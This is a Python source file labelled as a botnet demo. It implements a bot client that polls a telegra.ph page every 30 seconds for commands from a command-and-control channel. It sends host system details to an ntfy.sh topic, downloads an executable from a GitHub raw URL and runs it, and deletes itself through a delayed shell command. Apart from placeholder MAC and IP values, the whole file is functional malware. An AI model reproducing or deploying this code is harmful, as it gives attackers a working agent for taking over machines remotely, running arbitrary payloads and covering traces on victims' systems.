# BOT SCRIPT FOR THE BOTNET DEMO
import os
from signal import signal
import sys
import subprocess
import time
import requests
import platform
from bs4 import BeautifulSoup

# URL = "https://rentry.co/BNS_BN_2261404"
TELEGRAPH_URL = "https://telegra.ph/BNS-TESTING-03-10"
RESPONSE_URL = "https://ntfy.sh/BNS_BN_22"

class Bot:
    def __init__(self):
        self.__init_os_info()
        self.previous_command = None
        self.payloads = []
        self.quit = False
        self.__track_C2()  # Start tracking C2 server for commands

    def __init_os_info(self):
        # DEVICE ID
        self.MAC_ADDR = "00:1A:2B:3C:4D:5E"  # Placeholder for MAC address retrieval logic
        self.IP_ADDR = "192.168.1.100"  # Placeholder for IP address retrieval logic

        # DEVICE INFO
        self.ARCHITECTURE = platform.machine()
        self.CPU_INFO = platform.processor()

        # OS INFO
        self.OS_NAME = platform.system()
        self.OS_VERSION = platform.release()


    def __get_os_info(self):
        return f"MAC Address: {self.MAC_ADDR} \nIP Address: {self.IP_ADDR} \nOS: {self.OS_NAME} {self.OS_VERSION} \nArchitecture: {self.ARCHITECTURE} \nCPU: {self.CPU_INFO}"


    def __parse_html(self, html):
        soup = BeautifulSoup(html.text, "html.parser")
        article = soup.find("article", id="_tl_editor")

        # Handle error if article is not found
        if not article:
            return None
    
        # Remove title from command
        article.find("h1").decompose() if article.find("h1") else None

        # Get clean text content, strip whitespace
        command = article.get_text(separator="\n").strip()  
        return command


    def __pull_commands(self):
        r = requests.get(TELEGRAPH_URL)

        if r.status_code == 200:
            command = self.__parse_html(r)
            self.__handle_command(command)
            print(f"Bot pulled commands: {command}")
        else:
            print(f"Bot failed to pull commands.")


    # Check periodically for new commands from C2 server and execute them
    def __track_C2(self):
        while not self.quit:
            self.__pull_commands()
            time.sleep(30)  # Sleep for 1 minute
        

    # Update command if it's different from the previous one, return True if updated, False if same
    def __update_command(self, new_command):
        if new_command == self.previous_command:
            return False
        else:
            self.previous_command = new_command
            return True


    # Execute the payload on the bot's system, handle any errors that may occur during execution
    def __executePayload(self):
        print("Executing Payload...")
        self.payloads.append(subprocess.Popen("Payload.exe", creationflags=subprocess.CREATE_NEW_PROCESS_GROUP))
        print("Payload executed successfully.")

    # If a ID is within the command extract it and check if it matches the bot's ID, return True if it's for this bot, False otherwise
    def __isItMe(self, command):
        if "ID" not in command:
            return False

        # Extract ID from command
        bot_id = command.split("ID")[1].strip()
        return bot_id == self.MAC_ADDR

    def __stopPayload(self):
        print("Stopping Payloads...")
        for i in self.payloads:
            try:
                i.send_signal(1)  # Send CTRL_BREAK_EVENT to gracefully stop the process
                i.wait(timeout=5)
            except subprocess.TimeoutExpired:
                i.kill()
                i.wait()
            except Exception as e:
                print(f"Error stopping payload: {e}")

        print("All Payloads stopped successfully.")
        self.payloads = []

    # Handle commands received from C2 server
    def __handle_command(self, command):
        
        if self.__update_command(command) == False:
            return  # No new command, skip execution

        if command == "STATUS":
            self.announce_status()
        elif command == "PAYLOAD":
            self.download_payload()
        elif command == "EXECUTE":
            self.__executePayload()
        elif command == "STOP":
            self.__stopPayload()
        elif command == "REMOVE":
            self.schedule_self_delete()
        else:
            pass  # Handle unknown command        


    # Download the payload from a specified URL and save it to the bot's system
    def download_payload(self):
        payloadURL = "https://raw.githubusercontent.com/WannesDH-2261159/BNS_BN_22/main/Payload.exe"
        outputFile = "Payload.exe"

        r = requests.get(payloadURL)
        if r.status_code == 200:
            with open(outputFile, "wb") as f:
                f.write(r.content)
            print("File downloaded successfully")
        else:
            print("Failed to download file:", r.status_code)


    # Announce bot status to C2 server
    def announce_status(self):
        r = requests.post(RESPONSE_URL, data=self.__get_os_info().encode(encoding='utf-8'))

        if r.status_code == 200:
            print(f"Bot announced status successfully.")
        else:
            print(f"Bot failed to announce status.")


    # Remove all payload files from the bot's system
    def cleanupPayloads(self):
        import glob

        folderPath = "./payloads"
        filesList = glob.glob(folderPath + "/*")

        for file in filesList:
            print("Removing File {}".format(file))
            os.remove(file)
        print("All Files are Remove if Existed")


    def schedule_self_delete(self):
        exe_path = os.path.abspath(sys.argv[0])
        if os.name == "nt":  # Windows
            subprocess.Popen(
                f'cmd /c ping 127.0.0.1 -n 2 > nul & del "{exe_path}"',
                shell=True
            )
        else:  # Linux / macOS
            subprocess.Popen(
                f'sh -c "sleep 1 && rm \\"{exe_path}\\""',
                shell=True
            )

        self.quit = True


# r = requests.get(url, stream=True)
# if r.status_code == 200:
#     with open(save_path, "wb") as f:
#         for chunk in r.iter_content(chunk_size=8192):
#             f.write(chunk)
#     print(f"Payload downloaded to {save_path}")
#     return save_path
# else:
#     print(f"Failed to download payload: {r.status_code}")
#     return None